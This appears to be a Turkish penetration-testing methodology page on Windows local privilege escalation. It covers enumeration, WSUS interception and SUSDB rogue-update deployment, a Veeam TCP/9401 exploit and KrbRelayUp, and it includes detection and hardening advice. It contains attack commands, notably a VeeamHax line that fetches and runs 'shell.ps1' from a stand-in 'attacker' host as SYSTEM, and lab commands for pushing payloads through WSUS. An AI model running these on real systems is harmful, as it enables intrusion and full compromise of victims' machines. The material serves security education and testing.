# Windows Yerel Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfada, temel nitelikteki çeşitli kılavuzlardan genel Windows yetki yükseltme metodolojisi bir araya getirilmiştir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Uygulamaya yönelik enumerasyon akışında ayrıca topluluk atölyelerinden ve kontrol listelerinden yararlanılmıştır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Tarihî saldırı içeriğinde, Windows yetki yükseltme konulu DerbyCon sunumu da yer almaktadır.<sup>[[5]](#references)</sup>

## Windows'a Giriş

### Erişim Belirteçleri

**Windows erişim belirteçlerinin ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL'ler - DACL'ler/SACL'ler/ACE'ler

**ACL'ler - DACL'ler/SACL'ler/ACE'ler hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Bütünlük Düzeyleri

**Windows'ta bütünlük düzeylerinin ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Denetimleri

Windows'ta **sistemi enumerate etmenizi**, yürütülebilir dosyaları çalıştırmanızı **engelleyebilecek** ve hatta **etkinliklerinizi tespit edebilecek** çeşitli unsurlar vardır. Yetki yükseltme enumerasyonuna başlamadan önce aşağıdaki **sayfayı** **okuyup** tüm bu **savunma** **mekanizmalarını** **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, çevrimdışı bir UEFI NVRAM düzenlemesinin önyükleme öncesi DMA'ya ve Windows `SYSTEM` belleğini yamalama zincirine dönüşmesini de sağlayabilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess sessiz yükseltme

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess süreçleri, AppInfo'nun güvenli yol denetimleri atlatıldığında istem göstermeden High IL düzeyine ulaşmak için kötüye kullanılabilir. Özel UIAccess/Admin Protection atlatma iş akışına buradan göz atın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop erişilebilirlik kayıt defteri yayılımı, keyfî bir SYSTEM kayıt defteri yazma işlemi (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Yeni Windows derlemelerinde, ayrıcalıklı yerel NTLM kimlik doğrulamasının yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı **SMB keyfî bağlantı noktası** LPE yöntemi de kullanıma sunulmuştur:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgilerini enumerate etme

Windows sürümünde bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Sürüm Exploit'leri

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunuyor ve bu da bir Windows ortamının sunduğu **geniş saldırı yüzeyini** gösteriyor.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'ı gömülü olarak içerir)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — işletim sistemi derlemesini, yüklü güncellemeleri ve seçilmiş olası güvenlik duyurularını listeler; bir sonucu geçerli kabul etmeden önce tam ürünü ve yerini alan güncellemeleri doğrulayın.

Sürüme özgü bir yerel exploit için işletim sistemi mimarisinin yanı sıra **çalışan sürecin mimarisini** de kontrol edin. 64 bit Windows'ta 32 bit bir süreç, [WOW64 dosya sistemi yeniden yönlendirmesine](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) tabidir: `%windir%\System32` genellikle 32 bit sistem dizinine yönlendirilirken `%windir%\Sysnative` bu sürecin yerel sistem dizinine erişmesini sağlar. Bu takma ad 64 bit bir süreçte kullanılamaz. Bir işletim sistemi derlemesi veya eksik KB adayı, sistemin exploit edilebilir olduğunu kanıtlamaz; söz konusu soruna ilişkin [Microsoft güvenlik bülteniyle](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) karşılaştırarak çalışan derlemeyi, yüklü olan veya yerini alan güncellemeyi, süreç mimarisini ve exploit ön koşullarını doğrulayın.

Hizmet belleği bozulması örneği için [istemcinin kontrolündeki MIDI paylaşımlı bellek halkası ofsetlerine](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions) bakın. Yayımlanan stack ofsetleri yalnızca test edilen derleme için geçerlidir; `LOCAL SERVICE` yetkisine ulaşmak, daha sonra `SYSTEM`'e geçiş için kullanılan [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) adımından farklıdır.<sup>[[44]](#references)</sup>

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin GitHub depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kaydedilmiş herhangi bir credential/Juicy bilgi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` yalnızca bir örnektir. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalde her kullanıcının Documents klasörüne yazar; ancak `OutputDirectory` ayarı veya `Start-Transcript -OutputDirectory`, dosyaları paylaşılan ya da gizli bir klasöre yönlendirebilir. Bir transcript'i incelemeden önce etkin çıktı yolunu ve dosya ACL'sini kontrol edin: transcript, kimlik bilgileri de dahil olmak üzere komut argümanlarını ve çıktıları içerebilir. Okunabilir bir transcript, yalnızca içeriği kullanılabilir ve daha yüksek ayrıcalıklara sahip bir kimliği açığa çıkarıyorsa ve bu kimlik ilgili bağlamda oturum açabiliyorsa ipucu niteliğindedir.

### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; bu kayıtlar yürütülen komutları, komut çağrılarını ve betiklerin bazı bölümlerini kapsar. Ancak yürütmenin tüm ayrıntıları ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için belgelerdeki "Transcript files" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini tercih edin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowerShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Komut dosyasının yürütülmesine ilişkin tüm etkinlikler ve içeriğin tamamı kaydedilir; böylece her kod bloğu çalıştırılırken belgelenir. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur; bu iz, adli incelemeler ve kötü amaçlı davranışların analiz edilmesi için değerlidir. Yürütme anındaki tüm etkinlikler belgelenerek sürece ilişkin ayrıntılı bilgiler sunulur.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block için logging events, Windows Event Viewer'da şu yolda bulunabilir: **Uygulama ve Hizmet Günlükleri > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Önceki yönergelerde risk şu şekilde özetlenmişti:

Güncellemeler http**S** yerine http kullanılarak istenmiyorsa sistemi ele geçirebilirsiniz.

HTTP WSUS uç noktası, güncelleme meta verilerinin ele geçirilmesi ihtimalinin incelenmesi için bir göstergedir. İstismar ayrıca istemcinin söz konusu WSUS sunucusunu kullanmasına, saldırganın trafiği engelleyebilmesine veya kontrol edebilmesine ve istemcinin güncelleme güveni ile yükleme politikasına bağlıdır. Tek başına URL, kod yürütme olacağını göstermez. [Microsoft, WSUS meta verileri için TLS kullanılmasını önerir](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ağda SSL kullanmayan bir WSUS güncellemesinin kullanılıp kullanılmadığını kontrol etmek için cmd'de şu komutu çalıştırarak başlayabilirsiniz:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ya da PowerShell'de aşağıdakini:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Aşağıdakilerden biri gibi bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

Orijinal uygulanabilirlik ifadesi şöyleydi:

Ardından, **bu açıktan yararlanılabilir.** Son registry değeri 0 ise WSUS girdisi yok sayılır.

`UseWUServer` değeri `1` olduğunda Windows Update, yapılandırılmış intranet hizmetini kullanır. Bu, HTTP araya girme yolu için gerekli bir ön koşulun mevcut olduğunu doğrular; ancak araya girmenin, kötü amaçlı güncellemelerin kabul edilmesinin veya yükseltilmiş ayrıcalıklarla kurulum yapılmasının mümkün olduğunu kanıtlamaz. Değer `0` olduğunda, bu ilke tarafından yapılandırılan belirli WSUS uç noktası seçilmez.

Bu güvenlik açıklarından yararlanmak için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Bunlar, SSL kullanmayan WSUS trafiğine "sahte" güncellemeler enjekte etmek için kullanılan, MiTM amaçlı exploit scriptleridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını burada okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak, bu hata şu açıktan yararlanıyor:

> Yerel kullanıcı proxy'mizi değiştirme yetkimiz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimizi araya alıp varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus) aracını yerel olarak çalıştırabiliriz.
>
> Ayrıca, WSUS hizmeti mevcut kullanıcının ayarlarını kullandığından, kullanıcının sertifika deposunu da kullanır. WSUS ana bilgisayar adı için kendinden imzalı bir sertifika oluşturup bu sertifikayı mevcut kullanıcının sertifika deposuna eklersek, hem HTTP hem de HTTPS WSUS trafiğini araya alabiliriz. WSUS, sertifika üzerinde ilk kullanıma dayalı bir tür doğrulama uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir bulunuyorsa ve doğru ana bilgisayar adına sahipse hizmet tarafından kabul edilir.

Bu açıktan [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla yararlanabilirsiniz (yayınlandıktan sonra).

### WSUS yöneticisinin denetimindeki güncellemeler

Mevcut kimliğin bir WSUS sunucusunda güncellemeleri **yayımlayıp onaylayabildiği** durumlarda farklı bir yol söz konusudur. Sunucunun `WSUS Administrators` grubuna etkin üyeliği ve devredilmiş WSUS izinlerini kontrol edin, ardından onaylanan güncellemeyi alacak istemci bilgisayar grubunu belirleyin. [Microsoft, güncellemeleri onaylamak için WSUS Administrator ayrıcalıkları gerektiğini belirtir](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) ve [yayımlama için gereken güven ilişkisini belgeler](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): istemciler, yerel olarak yayımlanan içerik için kullanılan imzalama sertifikasına güvenmelidir. Bunu ayrıcalık yükseltme yolu olarak değerlendirmeden önce olası güncellemenin imzalandığını ve kabul edildiğini, hedef için geçerli olduğunu ve daha ayrıcalıklı bir bağlamda yüklendiğini doğrulayın. Tek başına bir HTTP `WUServer` değeri veya grup adı bu koşulları kanıtlamaz.

### SUSDB özel güncelleme suistimali: `.txt`/`.esd` üzerinden imzasız payload'lar

Bu, HTTP WSUS bağlantısının araya alınmasından farklı bir güven sınırı ihlalidir: ön koşul, özel bir güncellemeyi yayımlamak ve onaylamak için **WSUS veritabanındaki (`SUSDB`) saklı yordamları** kullanabilecek düzeyde erişimdir. Pratik bir erişim yolu, bir WSUS bilgisayar hesabının kimlik doğrulamasını `SUSDB` barındıran ayrı bir MSSQL sunucusuna aktarmaktır; kesin ön koşul dağıtıma göre değişir, bu yüzden SQL administrator haklarını varsaymak yerine önce `EXECUTE` izinlerini listeleyin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS istemci kimlik doğrulamasını HTTP/8530'dan LDAP, SMB veya AD CS'ye aktaran ayrı saldırı yolu için bkz. [NTLM relay için WSUS HTTP'sini suistimal etme](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Harici veritabanı aktarımını ve yordam izinlerini doğrulama

WSUS'un harici bir SQL Server kullandığı dağıtımlarda önce WSUS sunucu hesabının veritabanında kimlik doğrulaması yapıp yapamadığını ve NTLM relay'in bu dinleyiciye ulaşıp ulaşmadığını kontrol edin. Sunucunun SQL rolü, doğrudan tablo yazma işlemleri engellenmiş olsa bile güncelleme yayımlama yordamlarını kullanmaya izin verebilir; `SUSDB` üzerinde başarısız bir `UPDATE` işlemi, yayımlamanın engellendiğini kanıtlamaz. Özel bir güncellemeyi denemeden önce yetkili bir SQL oturumunda etkin kimliği, rol üyeliğini ve yordam izinlerini inceleyin.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Canlı yordam tanımları ve yüklü `SoftwareDistributionPackage.xsd`, geçerli güncelleme meta verilerini yeniden oluştururken kullanışlıdır. Bundle üst öğesi ve payload alt öğesinin her biri `UpdateIdentity` (parça türü `1`), `LocalizedProperties` (`4`) ve `ExtendedProperties` (`2`) gerektirir; her `spImportUpdate` çağrısının döndürdüğü yerel revizyon kimliğini kaydedin ve bundle ilişkisini, özet değerlerini, boyutu, içerik URL'sini ve revizyonu tutarlı tutun. Bu, durum bilgisi tutan bir yayımlama iş akışıdır; dolayısıyla tek bir başarılı saklı yordam çağrısı, istemci tarafında yürütmenin kanıtı değildir.<sup>[[38]](#references)</sup>

#### Güncellemeyi oluşturma, hedefleme ve onaylama

Özel güncelleme iş akışı, kısıtlı bir yayımlama API'si olarak meşru WSUS yordamlarını kullanır. Önemli durum geçişleri şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili saklı yordamlar |
| --- | --- |
| Güncelleme meta verilerini içe aktarma | `spImportUpdate` |
| Ön koşul, yerelleştirilmiş ve genişletilmiş XML parçalarını depolama | `spSaveXMLFragment` |
| İçerik özetini saldırganın denetimindeki URL ile ilişkilendirme | `spSetBatchURL` |
| Bilgisayar grubunu listeleme/oluşturma ve istemciyi ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Bu grup için yüklemeyi onaylama | `@actionID = 0` ve `@isAssigned = 1` ile `spDeployUpdate` |

Dosya adı, özet değerleri, boyut ve `CommandLineInstallation` işleyicisi, içe aktarılan meta veriler/parçalar arasında tutarlı olmalıdır. İçerik URL'sini ve hedef grubunu atadıktan sonra son onay aşağıdakine benzer; örnek GUID'leri yeniden kullanmak yerine yeni güncelleme, grup ve dağıtım tanımlayıcıları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Uzantı tabanlı imza atlatma

WSUS normalde imzasız rastgele yürütülebilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` dosyasındaki .NET `VerifyFile` yolu, verilen dosya adı `.txt` veya `.esd` ile bittiğinde sertifika denetimi bayrağını false olarak ayarlar; böylece baytların metin veya geçerli bir ESD görüntüsü olduğu önceden doğrulanmadan `CheckCertificateSignature` atlanır. Bu nedenle, örneğin `payload.exe.txt` olarak adlandırılmış değiştirilmemiş bir PE, içerik doğrulamasından geçebilir ve daha sonra güncellemenin komut satırı yükleme işleyicisi tarafından başlatılabilir. Bu, imza sahteciliği değil, bir ilke/tür karışıklığı hatasıdır.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS uyumlu staging ve otomasyon

`spDeployUpdate` çağrıldığında WSUS, kayıtlı içeriği getirir. Kaynağın BITS'in HTTP beklentilerini karşılaması gerekir: erişilebilir bir URL tek başına yeterli değildir; çünkü aktarım, ilk `HEAD`/`GET` akışını ve byte-range isteklerini kullanır. Range desteği olmayan bir sunucu, BITS'in Range protokolü üstbilgisini gerektirdiğini belirten WSUS eşitleme `EventId=364` hatası üretir.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gerekli SQL'i oluşturur, bu SQL'i çalıştırmak üzere değiştirilmiş bir MSSQL istemcisi içerir ve içerik staging'i için `BitsWebServer.py` dosyasını sunar. Yetkili bir laboratuvarda kullanılabilecek en basit komut şöyledir:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Gözetimsiz çalıştırma ve yeniden deneme kalıcılığı

İstemci tarafındaki etkileşim ilkelere bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` altındaki `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından elle seçilmeden indirilip yapılandırılmış zamanlamaya göre yüklenmesini sağlar. Testlerde, güncellemesi başarısız/tamamlanmamış durumda kalan bir payload, callback süreci sona erdikten hemen sonra yeniden sunuldu; dolayısıyla yeniden deneme davranışı yinelenen bir çalıştırma kalıcılığına dönüşebilir. İstemci güncellemenin başarısız olduğunu gösterdiği için bu yöntem gürültülüdür.<sup>[[39]](#references)</sup>

#### Tespit ve hardening adımları

Bu zincirden yararlanılarak sunucu ve istemci tarafında yapılabilecekler:<sup>[[39]](#references)</sup>

- `SUSDB` içinde `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` çalıştırmalarını denetleyin; yeni hedefleme gruplarını, harici içerik kaynaklarını, `.txt`/`.esd` güncelleme payload'larını ve beklenmedik principal'lar (özellikle bilgisayar hesabı olmayanlar) tarafından yapılan dağıtımları araştırın.
- `C:\Program Files\Update Services\LogFiles` içinde `ContentSyncAgent`, `FileVerified`, yanlış yazılmış `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; doğrulama kayıtlarını uzantı ve içerik imzasıyla karşılaştırın, uzantıya güvenmeyin.
- Windows Update yüklemesinin tekrar tekrar başarısız olup yeniden denenmesini ve `.txt` ya da `.esd` adlı içeriklerden kaynaklanan PE çalıştırmalarını veya beklenmedik alt süreç/ağ etkinliklerini araştırın.
- Desteklendiği durumlarda veritabanı hizmetinde Authentication için Extended Protection'ı zorunlu kılın ve veritabanı ağına erişimi WSUS sunucusu ile yetkili yönetim sistemleriyle sınırlandırın. Özel güncelleme yordamlarındaki `EXECUTE` haklarını en aza indirin ve denetleyin.

## Üçüncü Taraf Auto-Updater'lar ve Agent IPC (local privesc)

Birçok kurumsal agent, localhost IPC yüzeyi ve ayrıcalıklı bir güncelleme kanalı sunar. Enrollment bir saldırganın sunucusuna yönlendirilebiliyor ve updater sahte bir root CA'ya veya zayıf signer kontrollerine güveniyorsa, yerel bir kullanıcı SYSTEM hizmetine zararlı bir MSI yükletebilir. Genelleştirilmiş bir teknik için (Netskope stAgentSvc zincirini temel alır – CVE-2025-0309) buraya bakın:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Sürüme özgü orijinal açıklama ve keşif notu şöyleydi:

Veeam B&R < `11.0.1.1261`, saldırganın denetimindeki mesajları işleyen ve **NT AUTHORITY\SYSTEM** olarak rastgele komutlar çalıştırılmasına olanak tanıyan bir localhost hizmetini **TCP/9401** üzerinde açığa çıkarır.<sup>[[12]](#references)</sup>

- **Keşif**: dinleyiciyi ve sürümü doğrulayın; örneğin `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` komutlarıyla.

Veeam Backup & Replication ve Cloud Connect, varsayılan olarak **TCP/9401** üzerinde bir çekirdek yedekleme hizmeti kullanır. [Veeam'in güvenlik duyurusu](https://www.veeam.com/kb4424), yedekleme ağı sınırları içinde şifrelenmiş yapılandırma veritabanı kimlik bilgilerinin kimlik doğrulaması olmadan ifşa edilmesini açıklar; ayrı bir herkese açık PoC ise **NT AUTHORITY\SYSTEM** olarak komut çalıştırma yolunu gösterir.<sup>[[12]](#references)</sup> Hizmet localhost dışında bir adrese de bağlanabilir; bu nedenle gerçek adresini ve PID'sini kontrol edin.

- **Keşif**: TCP/9401'in `Veeam.Backup.Service.exe` sürecine ait olduğunu doğrulayın, ardından yüklü ürünü ve yama meta verilerini inceleyin. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` komutları ipucu verir, ancak yama durumunu bütünüyle doğrulamaz.
- **Düzeltilmiş en eski sürümler**: Veeam, **11a build 11.0.1.1261 P20230227** ve **12 build 12.0.0.1420 P20230223** sürümlerini ilk düzeltilmiş sürümler olarak listeler; daha eski sürümler etkilenir. Dört parçalı dosya sürümü tek başına, aynı build numaralarındaki yamalanmamış temel sürüm ile daha sonraki yamayı ayırt edemez. Sınırdaki bir build'i düzeltilmiş olarak değerlendirmeden önce yama tanımlayıcısını [üreticinin build geçmişiyle](https://www.veeam.com/kb2680) doğrulayın.
- **Exploit**: `VeeamHax.exe` gibi bir PoC'yi gerekli Veeam DLL'leriyle aynı dizine yerleştirin, ardından yerel socket üzerinden bir SYSTEM payload tetikleyin:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Servis komutu SYSTEM olarak yürütür.

Atıfta bulunulan PoC, ek ön koşullar sağlandığında komutların SYSTEM olarak yürütülebildiğini gösterir; tedarikçinin güvenlik duyurusu ise kimlik bilgisi ifşası sorununu açıklar.

## KrbRelayUp

Varsayılan ortamla ilgili ilk açıklama şöyleydi:

Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** güvenlik açığı bulunur. Bu koşullar arasında **LDAP signing'in zorunlu kılınmadığı,** kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmalarına olanak tanıyan self-rights izinlerine sahip olduğu ve kullanıcıların domain içinde bilgisayar oluşturabildiği ortamlar yer alır. Bu **gereksinimlerin** **varsayılan ayarlarla** karşılandığını belirtmek önemlidir.

Yerel bir Kerberos relay, uygun bir COM server kimlik doğrulaması yaptığında ve relay edilen principal hedef nesne üzerinde gerekli izinlere sahip olduğunda, düşük ayrıcalıklı bir oturum açma bağlamından ayrıcalıklı bir dizin yazma işlemine geçebilir. [KrbRelay belgeleri](https://github.com/cube0x0/KrbRelay) hem RBCD hem de `msDS-KeyCredentialLink` (shadow-credential) LDAP yazma işlemlerini açıklar; KrbRelayUp bu yolların bazılarını otomatikleştirir. Bir RBCD zinciri, ilgili delegation ve hedef nesne izinlerini gerektirirken shadow-credential zinciri key-credential yazma izinlerini ve sertifika kimlik doğrulama yolunu destekleyen bir KDC'yi gerektirir. Bu yollardan hiçbiri yalnızca domain üyesi olmaktan kaynaklanmaz.

